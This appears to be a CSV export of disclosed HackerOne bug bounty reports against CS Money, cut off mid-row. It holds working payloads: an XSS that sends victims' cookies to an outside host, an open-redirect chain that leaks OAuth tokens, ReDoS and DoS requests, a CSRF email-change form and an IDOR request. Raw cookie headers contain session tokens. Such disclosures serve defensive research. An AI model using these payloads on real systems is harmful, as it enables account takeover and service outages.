CS Money,51-100,0.0,100m-200m,$750.00,Medium,5.45,Improper Authentication - Generic,[cs.money] Open Redirect Leads to Account Takeover,"abdilahrf_  submitted a report to CS Money.Jun 22nd (2 years ago)Summary:
I found an open redirect on https://cs.money domain, using this payload https://cs.money///google.com we can redirect into any domain that we want, you can see the request and response from this image below :
███
Steps To Reproduce:
The final payload is having an account takeover as the impact, by chaining the openredirect vulnerability with login oauth function, the steps to reproduce is below:

Open this url https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523 , the login url was gotten from cs.money index page button sign in through steam:

█████████

Login as usual, the application will redirect you to https://loving-turing-29a494.netlify.app/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://cs.money///loving-turing-29a494.netlify.app# you will see like this image :
███████
3.the  attacker already received the victim token on the attacker listener
███

If the vulnerability requires hosted server, please, let us know if it is a public or a local one you've tested vulnerability on.
### Public
My POC Hosted here : loving-turing-29a494.netlify.app
I also create the video POC that show an attacker take over an victim account :
█████
Impact
Attacker gained full control of the victim account, was able to change the trade-offer link into the attacker link and redeem all the items into attacker account and almost can do anything.",https://hackerone.com/reports/905607,Washington,United States,Bellevue,2020,6,22,19,34
CS Money,51-100,0.0,100m-200m,$200.00,Medium,5.45,None,Application DOS via specially crafted payload on 3d.cs.money,"enigmaticjohn  submitted a report to CS Money.Sep 28th (2 years ago)Summary:
Hello Team,
While testing it was observed that on 3d.cs.money a DOS is possible via specially crafted request using only single request from single machine on search bar.
Though I am aware of the Out of Scope policy ""Any activity that could lead to the disruption of our service (DoS)"", this scenario is different, here we are only using one Request and depending on the payload, the DOS time can be varied.
Steps To Reproduce:

Go to https://3d.cs.money/item/default
Turn ON the intercept and type something in search box.
A POST request will be captured as follows:

Code 657 BytesWrap lines Copy Download1POST /api/skin/search HTTP/1.1
2Host: 3d.cs.money
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json;charset=utf-8
8Content-Length: 32
9Origin: https://3d.cs.money
10Connection: close
11Referer: https://3d.cs.money/item/default
12Cookie: __cfduid=d38bfad20d6ec52ba0a6af9014d27a2e81601313370; TEST_GROUP=2; UUID3D=to4nZuWnRSS4A7G; _ga=GA1.1.214308118.1601313374; _ga_HY7CCPCD7H=GS1.1.1601313373.1.1.1601316641.57; _gid=GA1.2.24460124.1601313377
13
14{""name"":""[Payload here]"",""item_name"":""AK-47""}


Send it to the Repeater.


Put the following payload at [Payload here]
(((((()0)))))


This will take down the host for few minutes.


If we add more parenthesis like ((((((()0)))))) , the site will be down for more time.


Supporting Material/References:
PFA screenshot.
Impact
Web server can be made inaccessible for any amount of time using only single request.1 attachment:F1006629: host_site.jpeg",https://hackerone.com/reports/993582,Washington,United States,Bellevue,2020,9,28,18,28
CS Money,51-100,0.0,100m-200m,"$1,000.00",Critical,9.5,Cross-site Scripting (XSS) - Stored,Blind XSS on image upload,"gatolouco  submitted a report to CS Money.Oct 17th (2 years ago)Summary:

The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

Steps To Reproduce:
XSS


use a proxy like burp suite and turn intercept on


upload a file to the support chat


change the filename to \""><img src=1 onerror=\""url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';


open the chat support and xss will activate
CSRF


create a file html in some server


create a form with a file and the payload name


send to a new tab. This one will post the image with payload


Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii
Impact
Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.3 attachments:F1039701: expected_request.pngF1039707: payload.txtF1039709: result.pngSummary by gatoloucoThis was my first report, so it is a little mess.
Let me explain: I found a XSS when I send a image in the support chat and change the image name to some script.
The CSRF part you can ignore, since the hacker can inject XSS in the support, then send a message (as support) with the XSS image to every user.
Yeah, it is a massive XSS, tons of users would be affected.
In the comments I explain I little better.",https://hackerone.com/reports/1010466,Washington,United States,Bellevue,2020,10,17,4,17
CS Money,51-100,0.0,100m-200m,$100.00,Low,2.0,None,Bypass Filter on link of build,"khoabda1  submitted a report to CS Money.Sep 25th (2 years ago)Summary:
Hello team, I found that a valid build will have a link with the following format
Code 35 BytesWrap lines Copy Download1https://3d.cs.money/item/0UkWN8vh2R
If you save a build with /api/build/save. It will return a link to sync with your save builds
The bug occurs when web app sync, you can custom the link of build with whatever you want with the format 
Code 35 BytesWrap lines Copy Download1//YOUR_LINK/item/WHAT_EVER_YOU_WANT
Steps To Reproduce:
[add details for how we can reproduce the issue]

Make a build. Save build. Intercept request sync
Edit request sync. For example:

Code 2.63 KiBWrap lines Copy Download1POST /sync HTTP/1.1
2Host: 3d.cs.money
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
4Accept: application/json, text/plain, */*
5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
6Content-Type: application/json;charset=utf-8
7Content-Length: 3455
8Origin: https://3d.cs.money
9Connection: close
10Referer: https://3d.cs.money/item/0UkWN8vh2R
11Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1.123687832.1600828067; _ga_HY7CCPCD7H=GS1.1.1600999331.12.1.1600999740.56; _gid=GA1.2.745101638.1600828070; language=en; sellerid=2351662; theme=darkTheme; pro_version=false; tmr_reqNum=84; tmr_lvid=a86af86a1e546621ee998805dedf795e; tmr_lvidTS=1600829462593; _ym_uid=1600829464576681153; _ym_d=1600829464; prism_89846284=886529b3-1b72-491d-8e3e-fb061941ce6b; amplitude_id_222f15bd4f15cdfaee99c07bcc641e5fcs.money=eyJkZXZpY2VJZCI6ImJlNWM1YjhmLWE3OTQtNDZiNC1iMzg5LWU2MzljYThkZTNiNlIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDk1MzY5NTUyOCwibGFzdEV2ZW50VGltZSI6MTYwMDk1Mzc5MzEyNywiZXZlbnRJZCI6NDAsImlkZW50aWZ5SWQiOjE4LCJzZXF1ZW5jZU51bWJlciI6NTh9; _fbp=fb.1.1600829468046.1736484188; csmoney_ga=GA1.2.348732095.1600829528; csmoney_ga_gid=GA1.2.929098124.1600829528; type_device=desktop; support_token=6f4a7515e3000799c5b9ffc20b3bdb808e065ec4a7d77c557bf14b72922136d9; amplitude_id_c14fa5162b6e034d1c3b12854f3a26f5cs.money=eyJkZXZpY2VJZCI6IjU0MTdhZjg4LTE0NDgtNDg3NC05YmNkLTFmMjczOGIwY2EyZFIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDk1MzYyMjg4MSwibGFzdEV2ZW50VGltZSI6MTYwMDk1MzYyMjg4MywiZXZlbnRJZCI6Mjk5LCJpZGVudGlmeUlkIjo0LCJzZXF1ZW5jZU51bWJlciI6MzAzfQ==; amp_d77dd0=nCXsKPRaEaZ_9OrPDjz6cM...1ej04bc91.1ej04d4lf.0.1.1; amp_d77dd0_cs.money=nCXsKPRaEaZ_9OrPDjz6cM...1ej04bc98.1ej04frr7.1p.2.1q; steamid=76561198389408392; avatar=https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/9e/9e972864d883f1b2e12cde94c8f83ef005c22438_medium.jpg; username=khoadeptrai; thirdparty_token=83a3e70e33f5a91ced64ee3a0fd005d80e119cb762c2d82449707c0eba6efcf1; trade_link=https%3A%2F%2Fsteamcommunity.com%2Ftradeoffer%2Fnew%2F%3Fpartner%3D429142664%26token%3DI1hTESVQ; _privy_undefined=%7B%22uuid%22%3A%22aa550b56-d1d7-425a-a4f8-28b3b53d6a71%22%7D; _privy_0A13181283E3DE28238D8AB1=%7B%22uuid%22%3A%22aa550b56-d1d7-425a-a4f8-28b3b53d6a71%22%2C%22variations%22%3A%7B%7D%2C%22country_code%22%3A%22VN%22%2C%22region_code%22%3A%22VN_35%22%2C%22postal_code%22%3A%22%22%7D
12
13{""backgrounds"":[""/assets/images/back3.jpeg""],""builds"":[{""href"":""//asd.com/item1/cc"",""name"":""AK-47 | Redline (Minimal Wear)\"""",""date"":1601000408019}],""edition"":1}
PoC
Image F1002083: Screenshot_4.png 153.81 KiBZoom in Zoom out Copy Download
Impact
Bypass the format (regex?) on the link of  a build1 attachment:F1002083: Screenshot_4.png",https://hackerone.com/reports/990838,Washington,United States,Bellevue,2020,9,25,3,39
CS Money,51-100,0.0,100m-200m,$200.00,Low,2.0,User Interface (UI) Misrepresentation of Critical Information,Content Spoofing/Text Injection in https://support.cs.money and JS file not minified and uglyfied which makes it clearly readable ,"rootishere  submitted a report to CS Money.Oct 3rd (2 years ago)Issue 1:
Greetings,
Hello Team,
I have found a Content Spoofing/Text Injection on this domain https://support.cs.money
Using the below link the attacker can trick any genuine user to go to the attacker's phishing site.
The attacker could craft the URL by providing discounts which will tempt the user to visit the attacker URL mentioned, as the site displaying the message still belongs to https://support.cs.money
Steps To Reproduce
POC URL
support cs money url
Issue 2 - worker.js file is user-readable
https://cs.money/js/worker.js?language=en&v=1331&csrf_token=[removed]
The worker.js contains a lot of business logic which is deployed in production whiteout being minified or uglified. This might lead an attacker to craft attacks in future as it uses 

location.href`
eval
in the below code snipped 

Code 270 BytesWrap lines Copy Download1case 'method':
2            try {
3                postMessage({
4                    cbid: data.cbid,
5                    result: eval(`(${data.method})`)()
6                });
7            } catch (err) {
8                console.warn(err);
9            }
10            break;
PoC Screenshots attached.
Let me know if you need more information.
Cheers!
Impact
Crafted phishing attacks on cs.money2 attachments:F1013106: Phising_attack.pngF1013107: plain_text_workerjs_file.png",https://hackerone.com/reports/997198,Washington,United States,Bellevue,2020,10,3,16,41
CS Money,51-100,0.0,100m-200m,$200.00,Medium,5.45,Insecure Direct Object Reference (IDOR),IDOR in https://3d.cs.money/,"khoabda1  submitted a report to CS Money.Sep 25th (2 years ago)Summary:
Hello,
I found an IDOR in https://3d.cs.money/ which will allow you to save, edit, delete build of victim account without any grant on the victim account
Steps To Reproduce:
This bug based on steamID which is reflected on Steam or you can use any Steam ID Finder software to find (https://steamidfinder.com/)
To reproduce this bug, you need to have 2 accounts (attacker and victim)
My pair steamID is
Attacker: █████
Victim: ████████

Login in https://new.cs.money with your Attacker account. The website will set my cookie to  steamid=████████
Craft a request to sync your builds like this 

Code 2.56 KiBWrap lines Copy Download1POST /sync HTTP/1.1
2Host: 3d.cs.money
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
4Accept: application/json, text/plain, */*
5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
6Content-Type: application/json;charset=utf-8
7Content-Length: 286
8Origin: https://3d.cs.money
9Connection: close
10Referer: https://3d.cs.money/g3sg1-black-sand-fn
11Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1.123687832.1600828067; _ga_HY7CCPCD7H=GS1.1.1601010291.13.1.1601011220.60; _gid=GA1.2.745101638.1600828070; language=en; sellerid=2351662; theme=darkTheme; pro_version=false; tmr_reqNum=84; tmr_lvid=a86af86a1e546621ee998805dedf795e; tmr_lvidTS=1600829462593; _ym_uid=1600829464576681153; _ym_d=1600829464; prism_89846284=886529b3-1b72-491d-8e3e-fb061941ce6b; amplitude_id_222f15bd4f15cdfaee99c07bcc641e5fcs.money=eyJkZXZpY2VJZCI6ImJlNWM1YjhmLWE3OTQtNDZiNC1iMzg5LWU2MzljYThkZTNiNlIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDk1MzY5NTUyOCwibGFzdEV2ZW50VGltZSI6MTYwMDk1Mzc5MzEyNywiZXZlbnRJZCI6NDAsImlkZW50aWZ5SWQiOjE4LCJzZXF1ZW5jZU51bWJlciI6NTh9; _fbp=fb.1.1600829468046.1736484188; csmoney_ga=GA1.2.348732095.1600829528; csmoney_ga_gid=GA1.2.929098124.1600829528; type_device=desktop; support_token=6f4a7515e3000799c5b9ffc20b3bdb808e065ec4a7d77c557bf14b72922136d9; amplitude_id_c14fa5162b6e034d1c3b12854f3a26f5cs.money=eyJkZXZpY2VJZCI6IjU0MTdhZjg4LTE0NDgtNDg3NC05YmNkLTFmMjczOGIwY2EyZFIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMTAwMzA0MTE2NCwibGFzdEV2ZW50VGltZSI6MTYwMTAwMzA1OTU1MywiZXZlbnRJZCI6MzA2LCJpZGVudGlmeUlkIjo1LCJzZXF1ZW5jZU51bWJlciI6MzExfQ==; amp_d77dd0=nCXsKPRaEaZ_9OrPDjz6cM...1ej1qcnqb.1ej1qjat4.0.1.1; amp_d77dd0_cs.money=nCXsKPRaEaZ_9OrPDjz6cM...1ej1qcnqf.1ej1r92m4.39.2.3a; steamid=████; avatar=https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/9e/9e972864d883f1b2e12cde94c8f83ef005c22438_medium.jpg; username=khoadeptrai; thirdparty_token=83a3e70e33f5a91ced64ee3a0fd005d80e119cb762c2d82449707c0eba6efcf1; trade_link=https%3A%2F%2Fsteamcommunity.com%2Ftradeoffer%2Fnew%2F%3Fpartner%3D429142664%26token%3DI1hTESVQ; _privy_undefined=%7B%22uuid%22%3A%22aa550b56-d1d7-425a-a4f8-28b3b53d6a71%22%7D; _privy_0A13181283E3DE28238D8AB1=%7B%22uuid%22%3A%22aa550b56-d1d7-425a-a4f8-28b3b53d6a71%22%2C%22variations%22%3A%7B%7D%2C%22country_code%22%3A%22VN%22%2C%22region_code%22%3A%22VN_35%22%2C%22postal_code%22%3A%22%22%7D; _ym_isad=2; _ym_visorc_62327980=w
12
13{""backgrounds"":[""/assets/images/back3.jpeg""],""builds"":[],""edition"":1}

Change the value of steamidcookie to Victim SteamID (████████)
All the builds in the Victim build list are cleared

Impact
Add, Edit, Delete any build of any accounttriage_team CS Money staff  changed the status to Triaged. Sep 25th (2 years ago)Hey!
Marking triaged, we will change the way user is verified on the site.khoabda1   posted a comment. Sep 28th (2 years ago)Hello @triage_team,
This seems fixed. Any update?triage_team CS Money staff  posted a comment. Sep 28th (2 years ago)Hey!
Fixed indeed.CS Money  rewarded khoabda1 with a $200 bounty. Sep 28th (2 years ago)triage_team CS Money staff  closed the report and changed the status to Resolved. Sep 28th (2 years ago)khoabda1   requested to disclose this report. Sep 28th (2 years ago)Hello @triage_team,
Thanks for the bounty. But I don't agree with the decision of the bounty. The severity of IDORs vulnerability is default high (Your program can not choose the High option when report so I choose medium one)
In the policy, you guys will reward at least 400$ for High vulnerability in 3d.cs.money
Please recheck! Thank you!triage_team CS Money staff  posted a comment. Sep 28th (2 years ago)Hey!
We've reviewed similar report, and don't think that IDOR in this case would qualify for Highkhoabda1   posted a comment. Sep 28th (2 years ago)Hello @triage_team,
Thank you for your reply! I got it.
Can you check my other report?triage_team CS Money staff  agreed to disclose this report. Sep 28th (2 years ago)  This report has been disclosed. Sep 28th (2 years ago)",https://hackerone.com/reports/990878,Washington,United States,Bellevue,2020,9,25,5,44
CS Money,51-100,0.0,100m-200m,$100.00,Low,2.0,File and Directory Information Exposure,Internal Path Disclosure,"mr_vrush  submitted a report to CS Money.Sep 11th (2 years ago)Hello Team,
I would like to report internal path disclosure in response. I was trying for Stored XSS but got no luck in that process. I observed the responses, one of the responses showing file path with 500 Internal Server Error. 
Steps To Reproduce:

Go to cs.money and sign in through steam account.
Now click on chat support icon
Now try to upload file while uploading capture the request in burp and send it to the repeater.
Edit the request as shown in below. 


Content-Disposition: form-data; name=""file""; filename=""/../../../../../.html""
Content-Type: image   text/html
Content-Type: text/html

 ""5. After editing forward the request and observe the response.
""6. Response is 500 Internal Server Error with these two path in the response.
Supporting Material/References:

Image █████ shows edited part of the request.
Image █████ shows the response.
Image ███████ shows response in the browser.

Impact
This issue is not a major threat to security, but this information usually contains sensitive information.",https://hackerone.com/reports/979110,Washington,United States,Bellevue,2020,9,11,3,33
CS Money,51-100,0.0,100m-200m,$250.00,Medium,5.7,Denial of Service,ReDoS at wiki.cs.money graphQL endpoint (AND probably a kind of command injection),"mvm  submitted a report to CS Money.Oct 7th (2 years ago)Summary:
The endpoint /graphql has a vulnerable query operation named ""search"", that  can I send a Regex malformed parameter, in order to trick the original regular expression to a regex bomb expression. 

Payload with a ""common"" search, querying the value ""AAA"":

Code 128 BytesWrap lines Copy Download1query a { 
2  search(q: ""AAA"", lang: ""en"") {
3    _id
4   weapon_id
5    rarity
6    collection{ _id name }
7    collection_id 
8 
9 }
10}
Response:
Code 735 BytesWrap lines Copy Download1{
2  ""data"": {
3    ""search"": [
4      {
5        ""_id"": ""sticker-baaa-ckstabber"",
6        ""weapon_id"": null,
7        ""rarity"": ""High Grade"",
8        ""collection"": null,
9        ""collection_id"": null
10      },
11      {
12        ""_id"": ""sticker-ork-waaagh"",
13        ""weapon_id"": null,
14        ""rarity"": ""High Grade"",
15        ""collection"": null,
16        ""collection_id"": null
17      }
18    ]
19  },
20  ""extensions"": {
21    ""tracing"": {
22      ""version"": 1,
23      ""startTime"": ""2020-10-07T02:07:55.251Z"",
24      ""endTime"": ""2020-10-07T02:07:55.516Z"",
25      ""duration"": 264270190,
26      ""execution"": {
27        ""resolvers"": [
28          {
29            ""path"": [
30              ""search""
31            ],...[Resumed for convenience]
32        ]
33      }
34    }
35  }
36}
Pay attention in this part of JSON response: 
Code 91 BytesWrap lines Copy Download1      ""startTime"": ""2020-10-07T02:07:55.251Z"",
2      ""endTime"": ""2020-10-07T02:07:55.516Z"",
It's about a instantaneously response time.
Ok, now we're ready to play with this...
You can reveal the bug inserting ""\u0000"" on ""q"" parameter, in order to display an error with part of the graph query.


Payload A (see the error response):
Code 124 BytesWrap lines Copy Download1query a { 
2 search(q: ""\u0000)"", lang: ""en"") {
3   _id
4  weapon_id
5   rarity
6   collection{ _id name }
7   collection_id  
8}
9}


Response:
Code 318 BytesWrap lines Copy Download1{
2  ""errors"": [
3    {
4      ""message"": ""value (?=.*\u0000) must not contain null bytes"",
5      ""locations"": [
6        {
7          ""line"": 2,
8          ""column"": 3
9        }
10      ],
11      ""path"": [
12        ""search""
13      ],
14      ""extensions"": {
15        ""code"": ""INTERNAL_SERVER_ERROR""
16      }
17    }
18  ],
19....[Resumed]

Payload B (reveal that this parameter filter a value with a regex)

Code 132 BytesWrap lines Copy Download1query a { 
2  search(q: ""\u0000)"", lang: ""en"") {
3    _id
4   weapon_id
5    rarity
6    collection{ _id name }
7    collection_id  
8 }
9}
10
 Response:
Code 185 BytesWrap lines Copy Download1{
2 ""errors"": [
3   {
4     ""message"": ""Invalid regular expression: /(?=.*X))/: Unmatched ')'"",
5     ""locations"": [
6       {
7         ""line"": 2,
8         ""column"": 3
9       }
10...[Resumed]
11
GraphQL Payload With Regex BOMB
Code 174 BytesWrap lines Copy Download1query a { 
2  search(q: ""[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\"", lang: ""en"") {
3    _id
4   weapon_id
5    rarity
6    collection{ _id name }
7    collection_id 
8 }
9}
Steps To Reproduce:


Send a POST with the bomb payload: 
Code 536 BytesWrap lines Copy Download1curl 'https://wiki.cs.money/graphql' \  
2-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' \
3-H 'content-type: application/json' \
4-H 'accept: */*' \     
5--data-binary $'{""query"":""query a { \\n  search(q: \\""[a-zA-Z0-9]+\\\\\\\\s?)+$|^([a-zA-Z0-9.\'\\\\\\\\w\\\\\\\\W]+\\\\\\\\s?)+$\\\\\\\\\\"", lang: \\""en\\"") {\\n    _id\\n   weapon_id\\n    rarity\\n    collection{ _id name }\\n    collection_id \\n \\n }\\n}"",""variables"":null}' \
6--compressed
7```


Compare response times with a simple query ""AAA""  (explained above)


Supporting Material/References:
https://www.rexegg.com/regex-explosive-quantifiers.html
Impact
Denial of Service1 attachment:F1023378: recording-bug.webm",https://hackerone.com/reports/1000567,Washington,United States,Bellevue,2020,10,7,2,26
CS Money,51-100,0.0,100m-200m,$200.00,Low,2.0,Denial of Service,Pixel Flood Attack leads to Application level DoS,"mr_vrush  submitted a report to CS Money.Aug 30th (2 years ago)Summary:
Hello Team,
I had gone through your policy and I saw that DoS is out of scope but I am not sure about Application level DoS. The another reason to report  this attack because it affects  real customers who want to chat with your support team. I had tested this with two accounts 

From Account 1 I had tried to send 64K * 64K resolution image 
Simultaneously from Account 2 I had tried to  send normal image (with different Internet Connection).
The response was 502 for both images.

Steps To Reproduce:

Go to cs.money and login with Account1, Login Account2 on different device with different Internet Connection.
Now Find Support symbol.
Click on attachments and upload ""lottapixel.jpg""  from Account1. 
Simultaneously upload normal image from Account2.  

Supporting Material/References:
https://hackerone.com/reports/752073
https://hackerone.com/reports/752010
If you need more information please let me know.

[attachment / reference]
From: Device 1,  Account1
Image ""lottapixel.jpg"" is Payload
Image ""502.PNG"" is proof of attack is successful.

From: Device 2, Account2
Image ""upload timing from account2.png"" and ""Account2.png""  is proof that real users are also affected.
Impact
Real User are not able to send images to the support team.  It affects to the availability  of resource.  I had recorded 1.2 min downtime.
Thanks4 attachments:F969518: lottapixel.jpgF969519: 502.PNGF969520: upload_timing_from_account2.pngF969521: Account2.png",https://hackerone.com/reports/970760,Washington,United States,Bellevue,2020,8,30,15,13
CS Money,51-100,0.0,100m-200m,$200.00,Medium,4.1,Denial of Service,Server-side denial of service via large payload sent to wiki.cs.money/graphql,"michaelrowley  submitted a report to CS Money.Sep 28th (2 years ago)Summary:
By sending a large payload to wiki.cs.money, a malicious actor can cause a partial or full denial of service to other users using the graphql part of wiki.cs.money
Steps To Reproduce:


Setup burpsuite as a proxy


Go to burpsuite -> Proxy -> Options -> Match & Replace


Click add


ITEM = Request parameter value, Match = search_ten, Replace = YOUR_LONG_STRING. (my long string is a 35,520,000 character long '?' string.


Go to wiki.cs.money


Disable interception


spam random characters into the search box
You need to wait a minute or so for the denial of service to reflect in other users' devices, I presume that this is because the server needs to try to process such long strings.
## You have now caused a DoS.


Open a new browser that does not have a proxy connected, maybe on a separate connection to be sure.


Browse to wiki.cs.money


Try to use the search feature


F12


Go to timings


Examine!


https://i.ibb.co/DtXhCxm/image.png


Supporting Material/References:
It is possible that this is a site-wide vulnerability, on other parts of the website (main base domain cs.money) I noticed that Cloudflare protected the site from long payloads, maybe implement that here too!

https://i.ibb.co/DtXhCxm/image.png
https://i.ibb.co/Bc9h85L/image.png

Impact
People would not be able to use any services that require /graphql on wiki.cs.money
This is similar to https://hackerone.com/reports/887321 .",https://hackerone.com/reports/993005,Washington,United States,Bellevue,2020,9,28,11,11
CS Money,51-100,0.0,100m-200m,$300.00,Medium,5.45,Cross-Site Request Forgery (CSRF),Site-wide CSRF on Safari due to CORS misconfiguration (not localhost),"nnez  submitted a report to CS Money.Sep 7th (2 years ago)Description
Hello there, on new.cs.money or cs.money, there is anti-CSRF mechanism, which is Referer header check.
However, I discovered that regex logic for checking Referer header is flawed.
I found that adding { or } at the end of the domain pass the validation.
Therefore, if a request comes from new.cs.money{.attacker.com it would pass validation.
And because there is no other protective mechanisms in place (SameSite flag, Origin check, Content-Type check), thus allowing attacker to perform CSRF attack on victim.
According to this research, https://www.corben.io/advanced-cors-techniques/
Unlike other browsers, Safari will load the domain with weird characters like { or } in it.
You can try this by accessing new.cs.money{.withgoogle.com on Safari and Chrome then see the differences.
Steps To Reproduce
These steps are gonna demonstrate how an attacker can perform CSRF attack forcing user to change_email on this endpoint https://new.cs.money/change_email
1.Open Safari on MacOS, login on new.cs.money (you also need steam account to do this)
2.Open new tab on safari, and navigate to new.cs.money{.withgoogle.com
I want to note that new.cs.money{.withgoogle.com can be hosted on attacker site like, new.cs.money{.attacker.com. However, I'm still on the process of buying new domain, so I'm gonna come back and provide you with another way to exploit this with my domain. But I think that these steps are also enough for PoC
3.Inspect element to bring up javascript console (To enable dev tool, please refer to https://stackoverflow.com/questions/40234993/how-to-inspect-element-using-safari-browser)
4.Go to JS console, paste below code and hit enter
Code 359 BytesWrap lines Copy Download1var FormEl = `
2<form action=""https://new.cs.money/change_email"" method=""POST"">
3        <input type=""hidden"" name=""email"" value=""nnez+attacker@wearehackerone.com"" />
4        <button type=""submit"" style=""font-size:28pt;z-index:99999"">Submit</button>
5    </form>
6`;
7var Div = document.createElement('div');
8Div.innerHTML = FormEl;
9document.body.appendChild(Div);
5.Click submit button
6.Go back to https://new.cs.money/th/csgo/personal-info and see that the email is changed
Video Demonstration
Video F978459: new-cs-money-csrf-site-wide-safari.mp4 16.57 MiBZoom in Zoom out Copy Download
Impact
Because new.cs.money and cs.money implement anti-CSRF mechanism the same way, and use it in all endpoints, therefore, it could lead to site-wide CSRF attack on any endpoints. I can't test Cash Out function yet because I can't access it, but I set the severity to high because of this.
I can't access https://hackerone_sellmode.zaebumba.com/ despite the new credentials you updated.1 attachment:F978459: new-cs-money-csrf-site-wide-safari.mp4",https://hackerone.com/reports/975983,Washington,United States,Bellevue,2020,9,7,6,27
CS Money,51-100,0.0,100m-200m,$200.00,Medium,5.45,None,Bypass restrict of member subscription to use custom background in https://3d.cs.money without prime subscription,"khoabda1  submitted a report to CS Money.Sep 23rd (2 years ago)Summary:
In website https://3d.cs.money you need to subscribe prime to have a custom background for skin 
Image F999661: Screenshot_2.png 102.96 KiBZoom in Zoom out Copy Download
But with this vulnerability, we can use custom background without any fee required
Steps To Reproduce:
[add details for how we can reproduce the issue]

Grab a build of skin
Save it. Modify request

Code 10.15 KiBWrap lines Copy Download1POST /api/build/save HTTP/1.1
2Host: 3d.cs.money
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
4Accept: application/json, text/plain, */*
5Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
6Content-Type: application/json;charset=utf-8
7Content-Length: 8197
8Origin: https://3d.cs.money
9Connection: close
10Referer: https://3d.cs.money/item/1A0EmD0OCs
11Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1.123687832.1600828067; _ga_HY7CCPCD7H=GS1.1.1600870816.3.1.1600874988.52; _gid=GA1.2.745101638.1600828070; language=en; sellerid=2351662; theme=darkTheme; pro_version=false; tmr_reqNum=60; tmr_lvid=a86af86a1e546621ee998805dedf795e; tmr_lvidTS=1600829462593; _ym_uid=1600829464576681153; _ym_d=1600829464; prism_89846284=886529b3-1b72-491d-8e3e-fb061941ce6b; amplitude_id_222f15bd4f15cdfaee99c07bcc641e5fcs.money=eyJkZXZpY2VJZCI6ImJlNWM1YjhmLWE3OTQtNDZiNC1iMzg5LWU2MzljYThkZTNiNlIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDg3MTY1Mzk0NywibGFzdEV2ZW50VGltZSI6MTYwMDg3MTY5NDEzMCwiZXZlbnRJZCI6MjYsImlkZW50aWZ5SWQiOjEzLCJzZXF1ZW5jZU51bWJlciI6Mzl9; _ym_isad=2; _fbp=fb.1.1600829468046.1736484188; csmoney_ga=GA1.2.348732095.1600829528; csmoney_ga_gid=GA1.2.929098124.1600829528; type_device=desktop; support_token=904edd01ef3c4b4fde31754954db74025c1ccfa067c1e9b78226f8aa1479ac75; amplitude_id_c14fa5162b6e034d1c3b12854f3a26f5cs.money=eyJkZXZpY2VJZCI6IjU0MTdhZjg4LTE0NDgtNDg3NC05YmNkLTFmMjczOGIwY2EyZFIiLCJ1c2VySWQiOiI3NjU2MTE5ODM4OTQwODM5MiIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMDg3MTM3MzEzMiwibGFzdEV2ZW50VGltZSI6MTYwMDg3NDgxMzYxMywiZXZlbnRJZCI6MTQzLCJpZGVudGlmeUlkIjozLCJzZXF1ZW5jZU51bWJlciI6MTQ2fQ==; amp_d77dd0=nCXsKPRaEaZ_9OrPDjz6cM...1eitodi6u.1eitpb9lt.0.0.0; amp_d77dd0_cs.money=nCXsKPRaEaZ_9OrPDjz6cM...1eitodi71.1eitpba7b.u.0.u; steamid=76561198389408392; avatar=https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/9e/9e972864d883f1b2e12cde94c8f83ef005c22438_medium.jpg; username=khoadeptrai; thirdparty_token=fa1cc1d8330558c52db7fa1347a93d94a6ec0586e67e8de6530ee506a15ac6df; 